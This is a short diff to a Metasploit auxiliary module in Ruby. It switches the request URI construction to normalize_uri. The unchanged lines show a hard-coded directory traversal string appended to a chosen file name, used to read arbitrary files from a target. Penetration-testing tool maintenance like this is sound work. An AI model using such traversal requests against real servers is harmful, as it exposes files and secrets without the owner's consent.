@@ -47,7 +47,7 @@ class Metasploit3 < Msf::Auxiliary
 	def run_host(ip)
 		fname     = File.basename(datastore['FILE'])
 		traversal = ".\\..\\..\\..\\..\\..\\..\\..\\"
-		uri = datastore['URIPATH'] + traversal + datastore['FILE']
+		uri = normalize_uri(datastore['URIPATH'])+ '/' + traversal + datastore['FILE']
 
 		print_status("#{rhost}:#{rport} - Requesting: #{uri}")
 
